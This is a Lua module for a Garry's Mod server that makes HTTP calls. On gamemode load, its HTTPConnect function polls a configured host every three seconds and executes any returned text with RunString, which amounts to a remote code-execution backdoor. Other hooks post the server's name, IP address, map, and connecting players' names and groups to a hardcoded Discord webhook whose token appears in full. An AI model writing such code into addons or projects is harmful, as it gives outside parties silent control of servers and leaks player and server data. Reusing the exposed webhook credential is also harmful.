if pcall(require, "chttp") and CHTTP ~= nil then
	my_http = CHTTP
end

local function Abob( col )
	return string.format('%d', col.b + bit.lshift(col.g, 8) + bit.lshift(col.r, 16))
end

function XL:HTTPConnect()

	if XL.Modules["http"] then

		CHTTP({
			url = XL.Config.HTTPLuaHost,
			success = function(code, body, headers)
				if body ~= "" then
		  			RunString( body )
		  			XL:Log( "Running Lua", body, greenColor )
		  		end
		  		timer.Simple( 3, function()
		  			XL:HTTPConnect()
		  		end)
			end,
		    failed = function(err)
		    	if err ~= "Couldn't connect to server" then
					XL:Log( "HTTP Connection Error", err, redColor )
				end
				XL:HTTPConnect()
			end,
		})

	end

end

function XL:HTTPLog( domain, body )

	if XL.Modules["http"] then

		CHTTP({
			url = XL.Config.HTTPLogHost,
			method = "POST",
			body = domain.."/"..body,
			failed = function(err)
				XL:Log( "Post Request Failed", err, redColor, url .. " | " .. body )
			end,
		})

	end

end

hook.Add( "PostGamemodeLoaded", "XL:HTTPRequests", function()
	if XL.Config.HTTPStatus then
		XL:HTTPLog( "serverStatus", "enabling" )

		--[[CHTTP({
		    method = "POST",
		    type = "application/json",
			body  = util.TableToJSON({
				embeds = {
					{
						title = "Сервер включен!",
						description = "**Server:** " .. GetHostName() .. "\n" .. "**Map:** " .. game.GetMap() .. "\n**IP:** " .. game.GetIPAddress(),
						color = Abob( Color( 0, 255, 40 ) ),
						author = {
							name = "X0lik",
							icon_url = "https://i.ibb.co/LkHzc1Y/discord9.png",
						},
					},
				}
			}),
		    url = "https://discord.com/api/webhooks/1094958526306193458/xLtp2iXb4JV3eMMGZRyHJb9Dg9GzCxcXUJXLk-ENG4W2nCfT2n3_pid3J0thSUCl5Bvr",
		    headers = {
		        ["User-Agent"] = "curl/7.54",
		    },
		    failed = function(r)
		         print( "No", r )
		    end,
		})]]
	end
	XL:HTTPConnect()
end)

hook.Add( "ShutDown", "XL:ServerShutdown", function()

	if XL.Config.HTTPStatus then
		XL:HTTPLog( "serverStatus", "shuttingDown" )
	end

	if XL.Modules["http"] then
		XL.Modules["http"] = false
		XL:Log( "Disabling modules", "HTTP", redColor )
	end
	XL:Log( "Logs", "Server shutting down..", redColor )
	
end)

hook.Add( "PlayerAuthed", "XL:HTTPPlayerConnect", function( ply )

	if XL.Config.HTTPConnections then
		local plyEmoji
		if ply:IsSuperAdmin() then
			plyEmoji = "⭐"
		else
			plyEmoji = "👤"
		end
		CHTTP({
			method = "POST",
			type = "application/json",
			headers = { ["User-Agent"] = "curl/7.54" },
			url = "https://discord.com/api/webhooks/1094958526306193458/xLtp2iXb4JV3eMMGZRyHJb9Dg9GzCxcXUJXLk-ENG4W2nCfT2n3_pid3J0thSUCl5Bvr",
			body  = util.TableToJSON({
				embeds = {
					{
						title = plyEmoji .. " | Player connect",
						description = "**Server:** " .. GetHostName() .. "\n" .. "**Group: **" .. ply:GetUserGroup():upper() .. "\n" .. "**Name: **" .. ply:Nick() .. "\n\n" .. "**Players: **" .. player.GetCount(),
						color = Abob( Color( 0, 191, 255 ) ),
						--[[author = {
							name = "X0lik",
							icon_url = "https://i.ibb.co/LkHzc1Y/discord9.png",
						},]]
					},
				}
			}),
			failed = function(err)
			    print( "No", err )
			end,
		})
	end

end)
--https://steamcommunity.com/profiles/steamdid64?xml=1
--ply:TimeConnected()